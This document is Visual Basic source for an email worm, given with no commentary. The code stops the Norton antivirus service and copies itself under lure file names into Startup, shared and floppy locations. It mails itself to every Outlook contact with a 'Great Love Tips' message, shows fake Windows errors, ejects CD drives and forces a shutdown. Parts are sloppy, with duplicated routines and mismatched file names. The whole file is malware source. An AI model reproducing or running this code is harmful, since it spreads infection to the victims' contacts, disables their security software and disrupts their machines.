   Private Sub Form_Load()
   StopService "Norton Antivirus Auto Protect Service"
   End Sub

   Sub StopService(ServiceName As String)
   a = """" & ServiceName & """"
   Shell "net stop " & a, vbHide
   End Sub
   Private Sub Form_Load()
   Me.Hide
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Worm1.Exe"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\InnocentFile.exe"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\Me.EXE"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\OpenMe!.EXE"
   FileCopy App.Path + "\" + App.EXEName + ".exe", "C:\great_tips!.EXE"
   FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Documents and Settings\All Users\Start Menu\Programs\Startup\Welcome.exe"
         On Error Resume Next
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\Windows\Start Menu\Programs\Startup\Welcome.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "c:\My Shared Folder\changed.exe"
         FileCopy App.Path + "\" & App.EXEName & ".exe", "A:\changed.exe"
   Set so = CreateObject(fso)
   Set ol = CreateObject("Outlook.Application")
   Set out = Wscript.CreateObject("Outlook.Application")
   Set mapi = out.GetNameSpace("MAPI")
   Set a = mapi.AddressLists(1)
   For X = 1 To a.AddressEntries.Count
   Set Mail = ol.CreateItem(0)
   Mail.To = ol.GetNameSpace("MAPI").AddressLists(1).AddressEntries(X)
   Mail.Subject = "Fwd:Great Love Tips!"
   Mail.Body = "Do you want to suprise your wife or husband? Do you want to do something Romantic for them? Wanna find out how to get lucky  Sydney has made this Awesome Document Attached. It tells men everything a Lady wants! And Ladies you can add stuff onto it before forwarding it to all your freinds!"
   Mail.Attachments.Add = "C:\great_tips.exe"
   Mail.Send
   Next
   ol.Quit

   Me.Hide

      MsgBox "Windows Error 606"

      MsgBox "Error Running Error in systray.exe"

      MsgBox "Please Reinstall Windows!"


         Set oWMP = CreateObject("WMPlayer.OCX.7")
   Set colCDROMs = oWMP.cdromCollection
   If colCDROMs.Count >= 1 Then
   For i = 0 To colCDROMs.Count - 1
   colCDROMs.Item(i).Eject
   Next ' cdrom
   End If

    On Error Resume Next
    Shell "rundll32.exe user.exe,exitwindows"
    Shell "Shutdown.exe -s", vbMaximizeFocus - r


   End
   End Sub
